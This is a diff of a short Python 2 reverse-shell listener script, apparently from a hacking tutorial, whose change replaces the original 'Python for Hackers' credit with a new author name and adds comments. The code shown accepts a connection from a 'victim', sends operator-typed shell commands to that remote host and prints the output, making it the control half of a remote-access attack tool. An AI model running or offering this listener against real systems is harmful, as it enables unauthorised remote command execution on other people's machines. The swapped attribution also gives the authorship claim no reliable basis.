@@ -1,5 +1,5 @@
-# Python for Hackers - priyank Gada
-# www.youtube.com/priyankgada
+# Test Reverse TCP Shell Server 
+# By Sentinel Warren
 
 import socket    # For Building TCP Connection -- AF_INET
 def connect():
@@ -15,12 +15,12 @@ def connect():
     print '[+] We got a connection from: ', addr  #IP address of the victim will be display
     while True:
         command = raw_input("Shell> ")   # Input
-        if 'terminate' in command:
+        if 'terminate' in command:        # Terminate Loop
             conn.send('terminate')
             conn.close()
             break
         else:
-            conn.send(command)
+            conn.send(command)    # Otherwise we will send the command to the target
             print conn.recv(1024) # and print the result that we got back        
 def main ():
     connect()
